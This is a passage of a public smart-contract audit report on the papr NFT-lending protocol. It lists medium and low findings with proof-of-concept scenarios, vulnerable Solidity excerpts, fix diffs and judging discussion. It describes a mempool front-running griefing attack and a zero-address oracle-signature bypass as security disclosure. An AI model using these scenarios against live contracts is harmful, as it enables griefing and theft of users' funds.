is probably right that it makes sense to stop minting more debt with these. \n\n***\n\n## [[M-03] Grieving attack by failing user's transactions](https://github.com/code-423n4/2022-12-backed-findings/issues/92)\n*Submitted by [HE1M](https://github.com/code-423n4/2022-12-backed-findings/issues/92), also found by [HollaDieWaldfee](https://github.com/code-423n4/2022-12-backed-findings/issues/208)*\n\nAn attacker can apply grieving attack by preventing users from interacting with some of the protocol functions. In other words whenever a user is going to reduce his debt, or buy and reduce his debt in one tx, it can be failed by the attacker.\n\n### Proof of Concept\n\nIn the following scenario, I am explaining how it is possible to fail user's transaction to reduce their debt fully. Failing other transactions (buy and reduce the debt in one tx) can be done similarly.\n\n*   Suppose Alice (an honest user) has debt of 1000 `PaprToken` and she intends to repay her debt fully:\n*   So, she calls the function `reduceDebt` with the following parameters:\n    *   `account`: Alice's address\n    *   `asset`: The NFT which was used as collateral\n    *   `amount`: 1000 \\* 10\\*\\*18 (decimal of `PaprToken` is 18).\n\n<!---->\n\n    function reduceDebt(address account, ERC721 asset, uint256 amount) external override {\n            _reduceDebt({account: account, asset: asset, burnFrom: msg.sender, amount: amount});\n        }\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L148>\n\n*   Bob (a malicious user who owns a small amount of `PaprToken`) notices Alice's transaction in the Mempool. So, Bob applies front-run attack and calls the function `reduceDebt` with the following parameters:\n    *   `account`: Alice's address\n    *   `asset`: The NFT which was used as collateral\n    *   `amount`: 1\n*   By doing so, Bob repays only **1** `PaprToken` on behalf of Alice, so Alice's debt becomes `1000 * 10**18 - 1`.\n\n<!---->\n\n    function _reduceDebt(address account, ERC721 asset, address burnFrom, uint256 amount) internal {\n            _reduceDebtWithoutBurn(account, asset, amount);\n            PaprToken(address(papr)).burn(burnFrom, amount);\n        }\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L481>\n\n    function _reduceDebtWithoutBurn(address account, ERC721 asset, uint256 amount) internal {\n            _vaultInfo[account][asset].debt = uint200(_vaultInfo[account][asset].debt - amount);\n            emit ReduceDebt(account, asset, amount);\n        }\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L486>\n\n*   Then, when Alice's transaction is going to be executed, it fails because of `Underflow Error`. Since Alice's debt is `1000 * 10**18 - 1` while Alice's transaction was going to repay `1000 * 10**18`.\n\n<!---->\n\n    _vaultInfo[account][asset].debt = uint200(_vaultInfo[account][asset].debt - amount);\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L487>\n\n*   Bob only pays a very small value of 1 `PaprToken` (consider that the decimal is 18) to apply this grieving attack.\n*   Bob can repeat this attack for Alice, if Alice is going to call this function again with correct parameter.\n\n***In summary, Bob could prevent the user from paying her debt fully by just repaying a very small amount of the user's debt in advance and as a result causing underflow error. Bob can apply this attack for all other users who are going to repay their debt fully. Please note that if a user is going to repay her debt partially, the attack can be expensive and not financially reasonable, but in case of full repayment of debt, it is very cheap to apply this grieving attack.***\n\n***This attack can be applied on the transactions that are going to interact with the function `_reduceDebt`. The transactions interacting with this specific function are:***\n\n*   `buyAndReduceDebt(...)`\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L229>\n\n*   `reduceDebt(...)`\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L149>\n\n***It means that the attacker can prevent users from calling the functions above.***\n\n### Recommended Mitigation Steps\n\nThe following condition should be added to the function `_reduceDebtWithoutBurn`:\n\n    function _reduceDebtWithoutBurn(address account, ERC721 asset, uint256 amount) internal {\n            if(amount > _vaultInfo[account][asset].debt){\n                amount = _vaultInfo[account][asset].debt;\n            }\n            _vaultInfo[account][asset].debt = uint200(_vaultInfo[account][asset].debt - amount);\n            emit ReduceDebt(account, asset, amount);\n        }\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L486>\n\n**[wilsoncusack (Backed) confirmed](https://github.com/code-423n4/2022-12-backed-findings/issues/92)** \n\n***\n\n## [[M-04] Incorrect usage of safeTransferFrom traps fees in Papr Controller](https://github.com/code-423n4/2022-12-backed-findings/issues/110)\n*Submitted by [0xalpharush](https://github.com/code-423n4/2022-12-backed-findings/issues/110)*\n\nBecause the Papr Controller never gives approval for ERC20 transfers, calls to `safeTransferFrom` on the Papr token will revert with insufficient approval. This will trap proceeds from auctions in the contract and prevent the owner/ DAO from collecting fees, motivating the rating of high severity. The root cause of this issue is misusing `safeTransferFrom` to transfer tokens directly out of the contract instead of using `transfer` directly. The contract will hold the token balance and thus does not need approval to transfer tokens, nor can it approve token transfers in the current implementation.\n\n### Proof of Concept\n\nComment out [this token approval](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/test/paprController/OwnerFunctions.ft.sol#L67) as the controller contract does not implement functionality to call approve. It doesn't make sense to \"prank\" a contract account in this context because it deviates from the runtime behavior of the deployed contract. That is, it's impossible for the Papr Controller to approve token transfers. Run `forge test -m testSendPaprFromAuctionFeesWorksIfOwner` and observe that it fails because of insufficient approvals. Replace [the call to `safeTransferFrom`](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L383) with a call to `transfer(to, amount)` and rerun the test. It will now pass and correctly achieve the intended behavior.\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nCall `transfer(to, amount)` instead of `safeTrasferFrom` [here](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L383). Note, it's unnecessary to use `safeTransfer` as the Papr token doesn't behave irregularly.\n\n**[Jeiwan (warden) commented](https://github.com/code-423n4/2022-12-backed-findings/issues/110#issuecomment-1369792773):**\n > Good finding! In the current implementation `PaprController` doesn't accumulate fees, so it may not cause a loss of funds.\n\n**[wilsoncusack (Backed) confirmed](https://github.com/code-423n4/2022-12-backed-findings/issues/110)**\n\n**[trust1995 (judge) commented](https://github.com/code-423n4/2022-12-backed-findings/issues/110#issuecomment-1370856400):**\n > @wilsoncusack, will you agree that in the current iteration of the code, we can consider this a M level find as no funds are at risk?\n\n**[wilsoncusack (Backed) commented](https://github.com/code-423n4/2022-12-backed-findings/issues/110#issuecomment-1370860635):**\n > @trust1995 it's a tough call. No funds are at risk because we burn fees. So these functions are not needed or used right now. But if we did not burn fees then all papr fees would be stuck. In the whitepaper we mention the idea of an insurance fund. Tempted to say high? \n\n**[trust1995 (judge) commented](https://github.com/code-423n4/2022-12-backed-findings/issues/110#issuecomment-1373759952):**\n > I have reviewed this finding along with several other judges, and believe it is ultimately of Med severity. Thank you for your input.\n\n***\n\n## [[M-05] PaprController.buyAndReduceDebt: msg.sender can lose paper by paying the debt twice](https://github.com/code-423n4/2022-12-backed-findings/issues/187)\n*Submitted by [HollaDieWaldfee](https://github.com/code-423n4/2022-12-backed-findings/issues/187), also found by [evan](https://github.com/code-423n4/2022-12-backed-findings/issues/275), [bin2chen](https://github.com/code-423n4/2022-12-backed-findings/issues/220), and [0x52](https://github.com/code-423n4/2022-12-backed-findings/issues/112)*\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L208-L232>\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/libraries/UniswapHelpers.sol#L31-L61>\n\n### Impact\n\nThe `PaprController.buyAndReduceDebt` function (<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L208-L232>) should work like this:\n\n1.  `msg.sender` swaps some amount of the underlying token for papr token\n2.  This amount of papr token is used to repay debt for the address in the `account` parameter\n\n`msg.sender` and `account` can be different addresses such that one can repay anyone's debt.\n\nHowever there is a mistake in the function which leads to this behavior:\n\n1.  `msg.sender` swaps some amount of the underlying token for papr token\n2.  The papr token is sent to the `account` address\n3.  The papr token is burnt from the `msg.sender`\n4.  The amount of papr token burnt from the `msg.sender` is used to pay back the debt of the `account` address\n\nThe issue is that the swapped papr token are sent to `account` but the papr token are burnt from `msg.sender`.\n\nIn the best scenario when calling this function, the msg.sender does not have enough papr token to burn so the function call reverts.\n\nIn the scenario that is worse, the `msg.sender` has enough papr token to be burnt.\n\nSo the `account` address receives the swapped papr token and the debt of `account` is paid as well by the `msg.sender`.\n\nThereby the `msg.sender` pays double the amount he wants to.\n\nOnce by swapping his underlying tokens for papr.\n\nThe second time because his papr token are burnt.\n\n### Proof of Concept\n\nThe `PaprController.buyAndReduceDebt` function (<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L208-L232>) calls `UniswapHelpers.swap` (<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/libraries/UniswapHelpers.sol#L31-L61>):\n\n```solidity\n(uint256 amountOut, uint256 amountIn) = UniswapHelpers.swap(\n    pool,\n    account,\n    token0IsUnderlying,\n    params.amount,\n    params.minOut,\n    params.sqrtPriceLimitX96,\n    abi.encode(msg.sender)\n);\n```\n\nThe second parameter which has the value `account` is the recipient of the swap.\n\nThe last parameter which is `msg.sender` is the address paying the input amount for the swap.\n\nSo the `msg.sender` pays some amount of underlying and the papr that the underlying is swapped for is sent to the `account`.\n\nBut then the debt of `account` is reduced by burning papr token from `msg.sender`:\n\n```solidity\n_reduceDebt({account: account, asset: collateralAsset, burnFrom: msg.sender, amount: amountOut});\n```\n\nHowever the papr token from the swap were received by `account`. So the `msg.sender` pays twice and `account` receives twice.\n\n### Tools Used\n\nVS Code\n\n### Recommended Mitigation Steps\n\nThe swapped papr token should be sent to the `msg.sender` instead of `account` such that they can then be burnt from `msg.sender`.\n\nIn order to achieve this, a single line in `PaprController.buyAndReduceDebt` must be changed:\n\n```solidity\n         (uint256 amountOut, uint256 amountIn) = UniswapHelpers.swap(\n             pool,\n-            account,\n+            msg.sender,\n             token0IsUnderlying,\n             params.amount,\n             params.minOut,\n             params.sqrtPriceLimitX96,\n            abi.encode(msg.sender)\n        );\n```\n**[wilsoncusack (Backed) confirmed](https://github.com/code-423n4/2022-12-backed-findings/issues/187)** \n\n***\n\n## [[M-06] `PaprController` pays swap fee in `buyAndReduceDebt`, not user](https://github.com/code-423n4/2022-12-backed-findings/issues/196)\n*Submitted by [Jeiwan](https://github.com/code-423n4/2022-12-backed-findings/issues/196), also found by [HollaDieWaldfee](https://github.com/code-423n4/2022-12-backed-findings/issues/304), [unforgiven](https://github.com/code-423n4/2022-12-backed-findings/issues/301), [evan](https://github.com/code-423n4/2022-12-backed-findings/issues/270), [Franfran](https://github.com/code-423n4/2022-12-backed-findings/issues/264), [teawaterwire](https://github.com/code-423n4/2022-12-backed-findings/issues/263), [bin2chen](https://github.com/code-423n4/2022-12-backed-findings/issues/230), [poirots](https://github.com/code-423n4/2022-12-backed-findings/issues/189), [fs0c](https://github.com/code-423n4/2022-12-backed-findings/issues/174), [KingNFT](https://github.com/code-423n4/2022-12-backed-findings/issues/123), [noot](https://github.com/code-423n4/2022-12-backed-findings/issues/116), [0x52](https://github.com/code-423n4/2022-12-backed-findings/issues/113), [rvierdiiev](https://github.com/code-423n4/2022-12-backed-findings/issues/103), [Saintcode\\_](https://github.com/code-423n4/2022-12-backed-findings/issues/60), and [stealthyz](https://github.com/code-423n4/2022-12-backed-findings/issues/20)*\n\nSince `PaprController` is not designed to hold any underlying tokens, calling `buyAndReduceDebt` with a swap fee set will result in a revert. The function can also be used to transfer out any underlying tokens sent to the contract mistakenly.\n\n### Proof of Concept\n\n`PaprController` implements the `buyAndReduceDebt` function, which allows users to buy Papr tokens for underlying tokens and burn them to reduce their debt ([PaprController.sol#L208](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L208)). Optionally, the function allows the caller to specify a swap fee: a fee that's collected from the caller. However, in reality, the fee is collected from `PaprController` itself: `transfer` instead of `transferFrom` is called on the underlying token ([PaprController.sol#L225-L227](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L225-L227)):\n\n```solidity\nif (hasFee) {\n    underlying.transfer(params.swapFeeTo, amountIn * params.swapFeeBips / BIPS_ONE);\n}\n```\n\nThis scenario is covered by the `testBuyAndReduceDebtReducesDebt` test ([BuyAndReduceDebt.t.sol#L12](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/test/paprController/BuyAndReduceDebt.t.sol#L12)), however the fee is not actually set in the test:\n\n```solidity\n// Fee is initialized but not set.\nuint256 fee;\nunderlying.approve(address(controller), underlyingOut + underlyingOut * fee / 1e4);\nswapParams = IPaprController.SwapParams({\n    amount: underlyingOut,\n    minOut: 1,\n    sqrtPriceLimitX96: _maxSqrtPriceLimit({sellingPAPR: false}),\n    swapFeeTo: address(5),\n    swapFeeBips: fee\n});\n```\n\nIf fee is set in the test, the test wil revert with an \"Arithmetic over/underflow\" error:\n\n```diff\n--- a/test/paprController/BuyAndReduceDebt.t.sol\n+++ b/test/paprController/BuyAndReduceDebt.t.sol\n@@ -26,7 +26,7 @@ contract BuyAndReduceDebt is BasePaprControllerTest {\n         IPaprController.VaultInfo memory vaultInfo = controller.vaultInfo(borrower, collateral.addr);\n         assertEq(vaultInfo.debt, debt);\n         assertEq(underlyingOut, underlying.balanceOf(borrower));\n-        uint256 fee;\n+        uint256 fee = 1e3;\n         underlying.approve(address(controller), underlyingOut + underlyingOut * fee / 1e4);\n         swapParams = IPaprController.SwapParams({\n             amount: underlyingOut,\n```\n\n### Recommended Mitigation Steps\n\nConsider this change:\n\n```diff\n--- a/src/PaprController.sol\n+++ b/src/PaprController.sol\n@@ -223,7 +223,7 @@ contract PaprController is\n         );\n\n         if (hasFee) {\n-            underlying.transfer(params.swapFeeTo, amountIn * params.swapFeeBips / BIPS_ONE);\n+            underlying.safeTransferFrom(msg.sender, params.swapFeeTo, amountIn * params.swapFeeBips / BIPS_ONE);\n         }\n\n         _reduceDebt({account: account, asset: collateralAsset, burnFrom: msg.sender, amount: amountOut});\n```\n\n**[wilsoncusack (Backed) confirmed](https://github.com/code-423n4/2022-12-backed-findings/issues/20)** \n\n**[trust1995 (judge) commented](https://github.com/code-423n4/2022-12-backed-findings/issues/196#issuecomment-1370741970):**\n > Chosen as best because it shows how to improve an existing test, well done.\n\n***\n\n## [[M-07] Last collateral check is not safe](https://github.com/code-423n4/2022-12-backed-findings/issues/216)\n*Submitted by [hansfriese](https://github.com/code-423n4/2022-12-backed-findings/issues/216)*\n\nLiquidation might work incorrectly.\n\n### Proof of Concept\n\nThere is a function `purchaseLiquidationAuctionNFT()` to allow liquidators to purchase NFTs on auction.\n\nIn the line 273, the protocol checks if the current NFT is the last collateral using the `collateralValueCached`.\n\nBut it might be possible for Reservoir Oracle to return zero (for whatever reason) and in that case `collateralValueCached` will be zero even when the `_vaultInfo[auction.nftOwner][auction.auctionAssetContract].count!=0`.\n\nOne might argue that it is impossible for the Reservoir oracle to return zero output but I think it is safe not to rely on it.\n\n```solidity\nPaprController.sol\n264:     function purchaseLiquidationAuctionNFT(\n265:         Auction calldata auction,\n266:         uint256 maxPrice,\n267:         address sendTo,\n268:         ReservoirOracleUnderwriter.OracleInfo calldata oracleInfo\n269:     ) external override {\n270:         uint256 collateralValueCached = underwritePriceForCollateral(\n271:             auction.auctionAssetContract, ReservoirOracleUnderwriter.PriceKind.TWAP, oracleInfo\n272:         ) * _vaultInfo[auction.nftOwner][auction.auctionAssetContract].count;\n273:         bool isLastCollateral = collateralValueCached == 0;//@audit not safe\n274:\n275:         uint256 debtCached = _vaultInfo[auction.nftOwner][auction.auctionAssetContract].debt;\n276:         uint256 maxDebtCached = isLastCollateral ? debtCached : _maxDebt(collateralValueCached, updateTarget());\n277:         /// anything above what is needed to bring this vault under maxDebt is considered excess\n278:         uint256 neededToSaveVault = maxDebtCached > debtCached ? 0 : debtCached - maxDebtCached;\n279:         uint256 price = _purchaseNFTAndUpdateVaultIfNeeded(auction, maxPrice, sendTo);time\n280:         uint256 excess = price > neededToSaveVault ? price - neededToSaveVault : 0;\n281:         uint256 remaining;\n282:\n283:         if (excess > 0) {\n284:             remaining = _handleExcess(excess, neededToSaveVault, debtCached, auction);\n285:         } else {\n286:             _reduceDebt(auction.nftOwner, auction.auctionAssetContract, address(this), price);\n287:             remaining = debtCached - price;\n288:         }\n289:\n290:         if (isLastCollateral && remaining != 0) {\n291:             /// there will be debt left with no NFTs, set it to 0\n292:             _reduceDebtWithoutBurn(auction.nftOwner, auction.auctionAssetContract, remaining);\n293:         }\n294:     }\n295:\n\n```\n\n### Recommended Mitigation Steps\n\nChange the line 273 as below.\n\n```soliditiy\nbool isLastCollateral = _vaultInfo[auction.nftOwner][auction.auctionAssetContract].count == 0;\n```\n**[wilsoncusack (Backed) confirmed and commented](https://github.com/code-423n4/2022-12-backed-findings/issues/216#issuecomment-1370075373):**\n > Not sure if this was flagged in other issues but the outcome of this is significant: if we incorrectly think that it is a user's last NFT, then we will set their debt to 0. If they did in fact have other NFTs in, then they can withdraw these for free!\n\n**[trust1995 (judge) commented](https://github.com/code-423n4/2022-12-backed-findings/issues/216#issuecomment-1374537725):**\n > The impact of `underwritePriceForCollateral()` returning 0 when `count != 0` is clear. However, user has not specified a single plausible reason as to how the oracle could return 0. From my knowledge, it should not be possible with standard oracles, and therefore the finding can at most be treated as a Low level find. \n> Medium severity should clearly define hypotheticals, which are missing in the above report.\n\n**[hansfriese (warden) commented](https://github.com/code-423n4/2022-12-backed-findings/issues/216#issuecomment-1374573062):**\n > @trust1995 Please note that it is possible for the Reservoir oracle (that is used in this protocol) to return zero price.\n> \n> I tried their [test suite](https://docs.reservoir.tools/reference/getoraclecollectionscollectionflooraskv1) using a collection 0x495f947276749Ce646f68AC8c248420045cb7b5e.\n> \n> From the protocol's viewpoint, Reservoir is still an external dependency and I think no assumptions should be made about it.\n> \n> I reached out to the Reservoir protocol dev team regarding this and got a reply as below.\n> \n> ![screenshot_48](https://user-images.githubusercontent.com/45533148/211182410-db128844-3791-4bd6-9418-fbf6e9656dc0.png)\n> \n> After all, the Reservoir team also warns that it is not safe to assume their return price can not be zero.\n> \n\n**[trust1995 (judge) commented](https://github.com/code-423n4/2022-12-backed-findings/issues/216#issuecomment-1374787813):**\n > After deliberating on the decision with another judge, believe it is best to give warden the benefit of the doubt regarding hypotheticals surrounding zero return value. Will award Medium.\n\n\n\n***\n\n## [[M-08] User fund loss because function `purchaseLiquidationAuctionNFT()` takes extra liquidation penalty when user's last collateral is liquidated, (set wrong value for `maxDebtCached` when `isLastCollateral` is true)](https://github.com/code-423n4/2022-12-backed-findings/issues/255)\n*Submitted by [unforgiven](https://github.com/code-423n4/2022-12-backed-findings/issues/255), also found by [hansfriese](https://github.com/code-423n4/2022-12-backed-findings/issues/217)*\n\nFunction `purchaseLiquidationAuctionNFT()` purchases a liquidation auction with the controller's papr token. The liquidator pays the papr amount which is equal to price of the auction and receives the auctioned  NFT. Contract would transfer paid papr and pay borrower debt and if there is extra papr left, it would be transferred to the user. \n\nFor extra papr that is not required for brining user debt under max debt, contract gets liquidation penalty but in some cases (when the auctioned NFT is user's last collateral) contract take penalty from all of the transferred papr and not just the extra. So users would lose funds in those situations because of this and the fund could be big because the penalty is 10% of the price of the auction and in most cases user would lose 10% of his debt (the value of the NFT).\n\n### Proof of Concept\n\nThis is `purchaseLiquidationAuctionNFT()` code:\n\n        function purchaseLiquidationAuctionNFT(\n            Auction calldata auction,\n            uint256 maxPrice,\n            address sendTo,\n            ReservoirOracleUnderwriter.OracleInfo calldata oracleInfo\n        ) external override {\n            uint256 collateralValueCached = underwritePriceForCollateral(\n                auction.auctionAssetContract, ReservoirOracleUnderwriter.PriceKind.TWAP, oracleInfo\n            ) * _vaultInfo[auction.nftOwner][auction.auctionAssetContract].count;\n            bool isLastCollateral = collateralValueCached == 0;\n\n            uint256 debtCached = _vaultInfo[auction.nftOwner][auction.auctionAssetContract].debt;\n            uint256 maxDebtCached = isLastCollateral ? debtCached : _maxDebt(collateralValueCached, updateTarget());\n            /// anything above what is needed to bring this vault under maxDebt is considered excess\n            uint256 neededToSaveVault = maxDebtCached > debtCached ? 0 : debtCached - maxDebtCached;\n            uint256 price = _purchaseNFTAndUpdateVaultIfNeeded(auction, maxPrice, sendTo);\n            uint256 excess = price > neededToSaveVault ? price - neededToSaveVault : 0;\n            uint256 remaining;\n\n            if (excess > 0) {\n                remaining = _handleExcess(excess, neededToSaveVault, debtCached, auction);\n            } else {\n                _reduceDebt(auction.nftOwner, auction.auctionAssetContract, address(this), price);\n                remaining = debtCached - price;\n            }\n\n            if (isLastCollateral && remaining != 0) {\n                /// there will be debt left with no NFTs, set it to 0\n                _reduceDebtWithoutBurn(auction.nftOwner, auction.auctionAssetContract, remaining);\n            }\n        }\n\nAs you can see when `collateralValueCached` is 0 and user has no more collaterals left then the value of `isLastCollateral` set as true. And when `isLastCollateral` is true the value of `maxDebtCached` set as `debtCached` (line `maxDebtCached = isLastCollateral ? debtCached : _maxDebt(collateralValueCached, updateTarget());`) and the value of the `neededToSaveVault` would be 0 (line `neededToSaveVault = maxDebtCached > debtCached ? 0 : debtCached - maxDebtCached`) and the `excess` would be equal to `price` (in the line `excess = price > neededToSaveVault ? price - neededToSaveVault : 0`) so all the papr paid by liquidator would be considered as excess and the contract would get liquidation penalty out of that. So in the current implementation in last collateral liquidation all of the paid papr by liquidator would be considered excess:\n\n1.  uUer has no NFT left.\n2.  debtCached is 100.\n3.  collateralValueCached  is 0 and isLastCollateral is true.\n4.  maxDebtCached would be as debtCached which is 100.\n5.  neededToSaveVault would be debtCached - maxDebtCached which is 0.\n6.  excess would equal to price and code would take penalty out of all the price amount.\n\nCode wants to take penalty from what borrower is going to receive (other than the required amount for extra debt), but in the current implementation when it is last NFT code took fee from all of the payment. These are the steps that show how the issue would harm the borrower and borrower would lose funds: (of course user debt would be set to 0 in the end, but if price was higher than user debt user won't receive the extra amount).\n\n1.  User debt is 900 and price of auction is 1000 and user has no NFT left.\n2.  Some one pays 1000 Papr and buys the auctioned token, now user would receive 0 amount because the penalty would be 1000 \\* 10% = 100 and the debt is 900.\n3.  But penalty should be (1000-900) \\* 10% = 10 and user should have received 90 token.\n\nSo users would receive less amount when their last NFT is liquidated and the price is higher than debt. Users would lose 10% of their entitled fund. Most users can use one token as collateral so the bug can happen most of the time.\n\n### Tools Used\n\nVIM\n\n### Recommended Mitigation Steps\n\nThe code should be like this:\n\n    uint256 maxDebtCached = isLastCollateral ? 0: _maxDebt(collateralValueCached, updateTarget());\n\n**[wilsoncusack (Backed) confirmed](https://github.com/code-423n4/2022-12-backed-findings/issues/255)**\n\n**[trust1995 (judge) decreased severity to Medium](https://github.com/code-423n4/2022-12-backed-findings/issues/255)**\n\n***\n\n# Low Risk and Non-Critical Issues\n\nFor this contest, 34 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2022-12-backed-findings/issues/147) by **yixxas** received the top score from the judge.\n\n*The following wardens also submitted reports: [Breeje](https://github.com/code-423n4/2022-12-backed-findings/issues/292), \n[gz627](https://github.com/code-423n4/2022-12-backed-findings/issues/283), \n[ak1](https://github.com/code-423n4/2022-12-backed-findings/issues/279), \n[Franfran](https://github.com/code-423n4/2022-12-backed-findings/issues/268), \n[wait](https://github.com/code-423n4/2022-12-backed-findings/issues/267), \n[0xSmartContract](https://github.com/code-423n4/2022-12-backed-findings/issues/259), \n[Aymen0909](https://github.com/code-423n4/2022-12-backed-findings/issues/256), \n[SaharDevep](https://github.com/code-423n4/2022-12-backed-findings/issues/248), \n[lukris02](https://github.com/code-423n4/2022-12-backed-findings/issues/237), \n[bin2chen](https://github.com/code-423n4/2022-12-backed-findings/issues/234), \n[tnevler](https://github.com/code-423n4/2022-12-backed-findings/issues/224), \n[Diana](https://github.com/code-423n4/2022-12-backed-findings/issues/219), \n[imare](https://github.com/code-423n4/2022-12-backed-findings/issues/205), \n[Jeiwan](https://github.com/code-423n4/2022-12-backed-findings/issues/197), \n[unforgiven](https://github.com/code-423n4/2022-12-backed-findings/issues/191), \n[HE1M](https://github.com/code-423n4/2022-12-backed-findings/issues/181), \n[HollaDieWaldfee](https://github.com/code-423n4/2022-12-backed-findings/issues/172), \n[brgltd](https://github.com/code-423n4/2022-12-backed-findings/issues/171), \n[shark](https://github.com/code-423n4/2022-12-backed-findings/issues/150), \n[SmartSek](https://github.com/code-423n4/2022-12-backed-findings/issues/133), \n[IllIllI](https://github.com/code-423n4/2022-12-backed-findings/issues/125), \n[0x52](https://github.com/code-423n4/2022-12-backed-findings/issues/120), \n[0xAgro](https://github.com/code-423n4/2022-12-backed-findings/issues/118), \n[chrisdior4](https://github.com/code-423n4/2022-12-backed-findings/issues/109), \n[rvierdiiev](https://github.com/code-423n4/2022-12-backed-findings/issues/99), \n[Secureverse](https://github.com/code-423n4/2022-12-backed-findings/issues/94), \n[RaymondFam](https://github.com/code-423n4/2022-12-backed-findings/issues/76), \n[Bobface](https://github.com/code-423n4/2022-12-backed-findings/issues/67), \n[ladboy233](https://github.com/code-423n4/2022-12-backed-findings/issues/66), \n[Bnke0x0](https://github.com/code-423n4/2022-12-backed-findings/issues/48), \n[oyc\\_109](https://github.com/code-423n4/2022-12-backed-findings/issues/45), \n[Rolezn](https://github.com/code-423n4/2022-12-backed-findings/issues/12), and \n[0xhacksmithh](https://github.com/code-423n4/2022-12-backed-findings/issues/5)\n.*\n\n## [L-01] Current decay percentage could be too high\n\nhttps://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L44-L47\n\nCurrently, we have a decay per period of 70% and a period of 1 day. This means that every day, price drop will be 70%. While I understand that the protocol strives for an exponential decay dutch auction format, with the current numbers, price of NFT will quickly be negligible.\n\nAn example of how quickly the price can drop.\n\nDay 0: 1000\nDay 1: 300\nDay 2: 90\nDay 3: 27\n\n### Recommendation\n\nOne recommendation is to reduce this amount to a more reasonable 30-50%. It still maintains the property of exponential decrease, but at a slower pace.\n\n## [L-02] `latestAuctionStartTime` can be wrongly set to 0 even if an NFT is still selling in auction\n\nhttps://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L519-L530\n\nThis issue can happen when multiple collaterals are sent for auction. The vulnerability can happen due to `_purchaseNFTAndUpdateVaultIfNeeded()`.\n\n[PaprController.sol#L519-L530](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L519-L530)\n```solidity\nfunction _purchaseNFTAndUpdateVaultIfNeeded(Auction calldata auction, uint256 maxPrice, address sendTo)\n    internal\n    returns (uint256)\n{\n    (uint256 startTime, uint256 price) = _purchaseNFT(auction, maxPrice, sendTo);\n\n    if (startTime == _vaultInfo[auction.nftOwner][auction.auctionAssetContract].latestAuctionStartTime) {\n        _vaultInfo[auction.nftOwner][auction.auctionAssetContract].latestAuctionStartTime = 0;\n    }   \n\n    return price;\n}\n```\n\nWe note how `_vaultInfo[auction.nftOwner][auction.auctionAssetContract].latestAuctionStartTime` is set to 0 when `startTime == _vaultInfo[auction.nftOwner][auction.auctionAssetContract].latestAuctionStartTime`.\n\nIt is documented that when `latestAuctionStartTime == 0`, no auction is being held but this is not true.\n\n2 collaterals from a user can be sent to an auction, but the later one gets purchased first. This would set the `vault.latestAuctionStartTime` to 0 even though the first auction is still running. This can lead to potential problems in the future if we rely on this value.\n\n### Recommendation\n\nIt might be a good idea to restrict only one collateral to be sent to the auction at a time. Another high severity issue arises due to this as I have written in my other report.\n\n## [L-03] Using the 30 days TWAP floor price of the entire collection means that the protocol is largely restricted to using the NFTS that are close to the floor price.\n\nThere is currently a huge difference in price between the top few PUNK NFT, and the bottom few. For instance, the lowest ask price is currently `63.66 ETH` ( as of the time of writing this report ) as seen [here](https://www.larvalabs.com/cryptopunks). The top few NFTS are last sold in the range of 1000s of ETH. \n\nSince the value of the debt that a user can raise from the collateral is computed by the total number of deposited collaterals multiplied by the lowest price of the NFT in the collection, it makes little sense for anyone to use any higher-valued NFTs as collateral. This seriously limits the use of the protocol if only a limited number of NFTS are used.\n\n### Recommendation\n\nIt is recommended that we use a different metric to measure price here. We could target NFTs individually instead of seeing them as a group.\n\n## [L-04] Signature scheme is not checking that `signerAddress` is not 0\n\nhttps://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/ReservoirOracleUnderwriter.sol#L88\n\n`ecrecover` returns a value of 0 for invalid signature. We also note that in the constructor, there is no check to ensure that `oracleSigner` is not address 0.\n\nThe only check for validity of signature is this,\n\n```solidity\nif (signerAddress != oracleSigner) {\n    revert IncorrectOracleSigner();\n}\n```\n\nIf `oracleSigner` is set to `address(0)` then a malicious user can pass any price it wants into `oracleInfo` to bypass the check of signature used in `underwritePriceForCollateral()` and hence liquidate any collateral of any user, as well as being able to purchase this liquidated NFT at a price of 0.\n\n### Recommendation\n\nIt is recommendated to add the check `if(signerAddress == address(0)) revert Error()`.\n\n## [L-05] Using only the lowest price of the NFT of the entire collection can be dangerous\n\nLiquidation is decided based on the 30 days TWAP of the floor price of the collection. This might be manipulatable as we only have to manipulate a single NFT to drastically decrease the maximum debt that a user can hold since calculation is done by:\n\n> `Total number of NFTS * floor price`\n\nAn 